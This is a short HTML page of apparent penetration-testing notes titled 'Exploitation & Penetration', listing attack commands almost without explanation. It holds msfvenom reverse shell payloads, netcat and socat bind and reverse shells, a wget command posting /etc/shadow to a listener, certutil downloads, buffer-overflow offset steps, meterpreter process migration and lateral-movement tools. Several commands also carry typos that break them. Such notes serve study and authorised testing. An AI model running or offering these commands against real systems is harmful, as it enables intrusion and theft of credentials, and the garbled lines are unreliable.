<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>3 - Exploitation &amp; Penetration</title>
</head><body>nc 192.168.4.49 9999<br/>
python -c 'print "A" * 5000'<br/>
msf-pattern_create -l 5000<br/>
msf-pattern_offset -l 5000 -q 31704330<br/>
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.4.51 LPORT=7777 -b "\x00" -f c<br/>
nc -nvlp 7777<br/>
Immunity Debugger<br/>
msfconsole<br/>
While in Linux shell: whoami/hostname/date/arp -a/route<br/>
While in Windows shell: getuid/sysinfo/ps/netstat<br/>
Responder<br/>
psexec/crackmapexec<br/>
python -m SimpleHTTPServer 80<br/>
python -m pyftplib -p 21 <br/>
nc -nvlp 8081 &amp;&amp; wget --post-file=/etc/shadow 192.168.202.128:8081<br/>
Transfer text and binary files with nc: nc -nvlp 4444 &gt; incoming.exe &amp;&amp; nc -nv 10.11.0.22 4444 &lt; /usr/share/windows-resources/binaries/wget.exe<br/>
certutil -urlcache -f http://192.168.202.128/secrets.txt secrets.txt<br/>
"Remote administration" with nc: <ul><li style="list-style-type: none">Bind shell: nc -nvlp 4444 -e cmd.exe &amp;&amp; nc -nv 10.11.0.22 4444</li>
<li style="list-style-type: none">Reverse shell: nc -nvlp 4444 &amp;&amp; nc -nv 10.11.0.22 4444 -e /bin/bash</li>
</ul>
Socat:<ul><li style="list-style-type: none">Bidirectional byte streams: socat TCP4-LISTEN:4444 STDOUT &amp;&amp; socat - TCP4:10.11.0.4:4444</li>
<li style="list-style-type: none">Socat encrypted bind shell:</li>
<li style="list-style-type: none"><ul><li style="list-style-type: none">openssl rew -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</li>
<li style="list-style-type: none">cat bind_shell.key bind_shell.crt &gt; bind_shelll.pem</li>
<li style="list-style-type: none">socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXE C:/bin/bash</li>
<li style="list-style-type: none">socat - OPENSSL:10.11.0.4:4444,verify=o</li>
</ul>
</li>
</ul>
Pivoting w/ meterpreter and autoroute<br/>
Reverse shell for Apache Tomcat:<ul><li style="list-style-type: none">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.41 LPORT=4445 -f war &gt; shell.war</li>
<li style="list-style-type: none">nc -nvlp 4445</li>
<li style="list-style-type: none">meterpreter &gt; migrate -N winlogon.exe</li>
</ul>
While in Windows shell: net user tomcat<br/>
While in Wondows shell: systeminfo<br/>
Privilege escalation: winPEAS and linPEAS<br/>
xfreerdp /u:Administrator /p:administratorpassword /v:10.10.130.53<br/>
</body></html>